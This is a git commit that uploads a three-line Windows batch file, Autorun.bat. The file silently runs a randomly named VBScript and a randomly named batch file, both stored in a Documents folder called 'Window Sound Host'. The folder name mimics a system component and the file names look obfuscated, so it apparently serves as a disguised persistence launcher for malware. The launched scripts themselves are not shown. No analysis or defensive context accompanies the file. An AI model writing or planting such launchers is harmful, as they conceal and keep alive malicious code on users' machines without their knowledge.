989655795440041f28a2df5528f7693a1de16ce6
[LONG] <91588850+LONG-BAT@users.noreply.github.com>
2026-01-18 00:30:39 -0700

    Add files via upload

---
+++ Autorun.bat
@@ -0,0 +1,3 @@
+@echo off 
+wscript.exe "%userprofile%\documents\Window Sound Host\15a65da65s1d8w86s51d8aw.vbs" "%userprofile%\documents\Window Sound Host\116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat"
+exit
